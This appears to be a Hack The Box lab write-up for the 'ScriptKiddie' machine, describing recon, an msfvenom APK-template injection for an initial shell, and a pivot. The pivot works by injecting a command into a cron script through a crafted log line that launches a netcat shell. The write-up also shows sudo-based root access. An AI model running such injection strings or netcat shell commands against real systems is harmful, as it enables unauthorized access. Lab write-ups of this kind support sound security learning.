---
title: "HTB - ScriptKiddie"
date: 2021-06-10
draft: true
categories: ["hacking", "write-ups"]
tags: [HTB]
featuredImage: "/images/2021/06/SK_Logo.png"
---
## Intro

## Target
[HTB - ScriptKiddie](https://app.hackthebox.eu/machines/314)

## Recon
 Initial recon tells us the box is running linux, and that's about it!

## Enum
 During the enum phase

```text
sudo nmap -sC -sV -oA scans/fast $target_ip
```
```text
# Nmap 7.91 scan initiated Mon May 17 15:00:50 2021 as: nmap -sC -sV -oA scans/fast $target_ip
Nmap scan report for $target_ip
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 17 15:00:58 2021 -- 1 IP address (1 host up) scanned in 8.98 second
```

From this we discover an `SSH` service and a `Python webserver` on port 5000. It also confirms we are facing a Linux box.

Manually browsing to the website, we find that there are 3 tools : `nmap`, `searchsploit` anf `msfvenom`. After a few tries with `ffuf`, and `gobuster`, we couldn't find anything interesting.

However, after a quick search, `msfvenom` might be [vulnerable](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/).

## Exploitation
Let's test our theory and see if we can get a shell.

### Getting Initial Shell
In order to do so, we will fire up `MetaSploit` and generate a payload (we could also [download](https://www.exploit-db.com/exploits/49491) a payload and slightly modify it).

We then upload the payload as an Android template and before submitting it, let's not forget to start ar listener like so : `nc -nlvp 9001` (or your usual port). Let's, now, submit the request, and you should get a shell back as use kid. From here, I like to generate an ssh key and add it to the `.ssh/authorized_keys` for easier access. 

Once this is done, I have a proper shell and way to come back easily.

Let's grab `user`'s flag:

![User Flag](/images/2021/06/SK_User_Flag.png)

### Pivoting
Now that we are kid user, we notice that there is also a pwn user that is running a script periodically. Even more interestingly, it uses a file owned by kid as input.

The script in question is located at `/home/pwn/scanlosers.sh`  and looks like below:

```text
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

After a quick look at the script, we notice that it is reads the the file `/home/kid/logs/hackers`, search for the third field on the line, and run an `nmap` scan against this field.

Now we can trick this script into running a custom command after the `nmap`'s one.

After a few trial and errors, I arrived to the following line of code :

`echo "1 2 127.0.0.1';/home/kid/nc.sh;date" > /home/kid/logs/hackers`

with `nc.sh` being:

```text
#!/bin/bash

/home/kid/nc -lvp 9001 -e /bin/bash
```

Don't forget to run a listener on port 9001, in order to grab the reverse shell. I would have wanted to do the "ssh trick" for easier access, but the `.ssh/authorized_keys` is owned by root... So I'll have to make it do with the temporary shell as `pwn`'s user.


### PrivEsc
Now that we are pwn, let's start by a simple `sudo -l` :

![pwn sudo](/images/2021/06/SK_pwn_sudo.png)

msfconsole can be run as root without password.... let's do it and cat the `root`'s flag:

![Root Flag](/images/2021/06/SK_Root_Flag.png)

## Outro
This was quite a fun box, with a few extra steps for an "easy" machine. It also shows that hackers can be hacked! ;)